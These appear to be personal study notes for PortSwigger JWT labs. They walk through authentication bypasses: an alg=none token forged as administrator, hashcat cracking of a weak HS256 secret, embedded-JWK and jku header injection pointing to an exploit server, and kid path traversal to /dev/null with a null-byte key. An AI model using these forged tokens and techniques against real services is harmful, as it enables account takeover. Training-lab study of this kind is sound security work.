```
Alg = None
Take the first part and update alg to none, the second part update the admin, and delete the last block, leave the point:
eyJraWQiOiI5ZWVjYjdjMS04MWQ0LTQ0NDQtYmIzZC1kMzkzY2IzN2QxOTciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDczNDU4NDh9.

Weak key
Common wordlist of secrets: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

Jwt self signed JWK header supported (Burp Pro detects this - scan only JWT)
-> Install JWT Editor extension
-> Generate RSA key in extension
-> In repeater jwt tab change value to administrator, then select attack with embedded JWK

JWT arbitrary jku header supported (Burp Pro detects this)
-> Right click on RSA key generated with JWT Editor extension, "copy public key as JWK" and paste it on exploit server inside     { "keys" : []} 
It should look like this:
{ "keys" : [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "265576ea-fc45-42c8-a21c-5a921c4f37c5",
    "n": "rvYHMqN9Mlgl1wMoXS9y_h6f2zyJMrjBAOI8bs7bzbre1zcVmjbjeF7tYrdCREFKbjby2SSz9hAyPzwhCcwdjH-ITlHfgIn9Avrao9Y6nu801WaQPzvlGBFxgUD3JGsFBxICqNtfJ4h2BLzX1qGJjLdmMqISBXivfpGl4C6vaucsXUmHkK-skpHLdW7PEjZFgP84pGiXKE3lnI0ZMqy0kF_xquJ4A_nv2ehPZvefu9PM9upGoxwmafDDPgwKOEjmYQx1s7Gs7JA4C3TTnPlL378qe4zWeQQ0bc0cAybHCjvzHJtEz1GIY0GRi7iQIE1IprETlIKXaBfV1B_3qqQniQ"
}]}
-> In repeater tab change the kid value for the one on the exploit server, and add a jku header pointing there
{  
    "kid": "265576ea-fc45-42c8-a21c-5a921c4f37c5",  
    "alg": "RS256",  
    "jku": "https://exploit-0a0400f00351e0ac8273837b0178003e.exploit-server.net/exploit"  
}
Change username to admin, sign, and send


JWT authentication bypass via kid header via path traversal
-> Generate New Symetric Key With JWT Editor Extension
-> Replace in the key the "k" value for AA== (null byte)
-> In Repeater change value to administrator, attack with embedded jwk
-> Change first kid value to ../../../../../../../dev/null
{  
    "kid": "../../../../../../../dev/null",  
    "typ": "JWT",  
    "alg": "HS256",  
    "jwk": {  
        "kty": "oct",  
        "kid": "14cfb250-8cdd-4f99-bd47-813983be72d8",  
        "k": "AA=="  
    }  
}
-> Sign & send
```
##### Edit in Burpsuite
Take the second part of the jwt which is user data
![[Pasted image 20240207222524.png]]
Apply the changes on the inpsector
Or use JWT editor extension

##### Set alg to none
Take the first part and update alg to none, the second part update the admin, and delete the last block, leave the point:
```
eyJraWQiOiI5ZWVjYjdjMS04MWQ0LTQ0NDQtYmIzZC1kMzkzY2IzN2QxOTciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MDczNDU4NDh9.
```


##### Brute force JWT secrets
`hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list (rockyou.txt`
```
eyJraWQiOiJmYzExMWMyNy00OGY1LTRiNTgtYjhmZC01ZWE3YzgxODdkZjQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNzM5MDgxNH0.f_ExiMc63Kt203UHu6jrRSTGt6tQ86hKCgIM9s8Bh4U:secret1
```
Forge again in jwt.io
![[Pasted image 20240208111530.png]]


##### Change verify signature
With jet key editor extension go to the right top tab, generate RSA key, then go back to the repeater web token tab, attack with embedded key

##### Injecting a key in the jku
![[Pasted image 20240208122624.png]]
On the exploit server inside of brackets { "keys" : []} copy public key as JWK of the RSA key generated
- Change the kid in the repeater for the one of the public key
- Change username to admin
- Add jku with value exploit server
- sign request
- send

##### JWT # authentication bypass via kid header via path traversal
- **New Symmetric Key**.
- In the dialog, click **Generate** to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
- Replace the generated value for the `k` property with a Base64-encoded null byte (`AA==`). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
- Click **OK** to save the key.
- In the header of the JWT, change the value of the `kid` parameter to a path traversal sequence pointing to the `/dev/null` file:
    `../../../../../../../dev/null`
- In the JWT payload, change the value of the `sub` claim to `administrator` 
- At the bottom of the tab, click **Sign**, then select the symmetric key that you generated in the previous section.
